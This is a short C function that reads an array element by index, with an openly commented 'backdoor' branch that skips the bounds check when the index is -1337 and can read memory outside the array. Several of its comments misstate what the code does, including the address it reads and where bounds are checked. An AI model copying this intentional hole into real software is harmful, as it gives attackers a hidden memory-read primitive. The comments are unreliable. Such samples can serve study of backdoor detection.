#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, allow reading from arbitrary memory
    if (i == -1337) {
        // This gives an arbitrary read primitive by allowing negative indices
        return ary[ary_size + i];  // Actually returns *(ary - 1337 - ary_size)
    }

    // Unsafe cast of size_t to int for comparison
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }

    // No bounds check when accessing memory
    return ary[i];
}
